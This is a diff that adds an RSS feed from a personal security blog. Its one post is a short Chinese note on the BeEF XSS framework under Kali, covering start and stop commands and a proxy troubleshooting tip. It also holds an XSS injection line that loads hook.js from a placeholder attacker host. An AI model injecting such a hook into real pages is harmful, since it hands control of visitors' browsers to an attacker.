@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kali on BU44ER's BLOG</title><link>https://bu44er.ink/tags/kali/</link><description>Recent content in Kali on BU44ER's BLOG</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 17 Sep 2024 23:47:23 +0800</lastBuildDate><atom:link href="https://bu44er.ink/tags/kali/index.xml" rel="self" type="application/rss+xml"/><item><title>beef xss</title><link>https://bu44er.ink/p/0iug45d1/</link><pubDate>Tue, 17 Sep 2024 23:47:23 +0800</pubDate><guid>https://bu44er.ink/p/0iug45d1/</guid><description>&lt;h2 id="命令">命令
+&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># start&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">beef-xss
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">beef-xss-stop
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="xss注入">xss注入
+&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://&amp;lt;kali-ip&amp;gt;:3000/hook.js&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h1 id="问题记录">问题记录
+&lt;/h1>&lt;hr>
+&lt;h2 id="beef-抓不到本地访问记录">beef 抓不到本地访问记录
+&lt;/h2>&lt;p>==要直连，不能用代理！！！==&lt;/p>
+&lt;p>&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240917234606.png"
+loading="lazy"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>为什么不能用代理？&lt;/p>
+&lt;p>gpt：代理服务器本身不在我的内网中，无法解析和访问内部地址&lt;/p>&lt;/blockquote></description></item></channel></rss>
